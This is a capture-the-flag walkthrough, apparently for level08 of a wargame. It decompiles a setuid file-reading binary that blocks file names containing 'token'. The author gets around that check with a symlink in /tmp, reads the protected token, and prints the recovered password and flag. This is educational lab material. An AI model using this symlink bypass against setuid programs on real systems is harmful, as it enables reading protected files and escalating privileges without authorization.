with a `ls -la` we can find two file:
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token

level08 is a not stripped ELF 32-bit LSB executable
token is a file where we have no permission

we use `scp -P 4242 level08@<ip>:/home/user/level08/level08 ./level08_bin` to download the executable and use `https://dogbolt.org/` to decompile the code.
With a bit of cleaning we get this code:
```c
int main(int argc, const char **argv, const char **envp)
{
  if (argc == 1)
  {
    printf("%s [file to read]\n", argv[0]);
    exit(1);
  }

  if (strstr(argv[1], "token"))
  {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
  }

  int fd = open(argv[1], O_RDONLY);
  if ( fd == -1 )
  {
    err(1, "Unable to open %s", argv[1]);
  }

  ssize_t read_value;
  char buf[1024];

  read_value = read(fd, buf, 1024);
  if ( read_value == -1 )
  {
    err(1, "Unable to read fd %d", fd);
  }
  return write(1, buf, read_value);
}
```

This code use `open(argv[1])` and write 1024bytes in it and write it on the stdout
We can also see that there is a specific check with the `"token"` string in the name of the file that do not allow us to run `./level08 token` directly

We can trick the check for `"token"` in the name just by creating a symbolic link because `open()` function will follow the symbolic link:
`ln -s /home/user/level08/token /tmp/flag`
And and can now run the executable in this symbolic link:
`./level08 /tmp/flag`

Output:
`quif5eloekouj29ke0vouxean`

with that we can log with `flag08` and run `getflag`
```bash
$ su flag08
Password: 
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```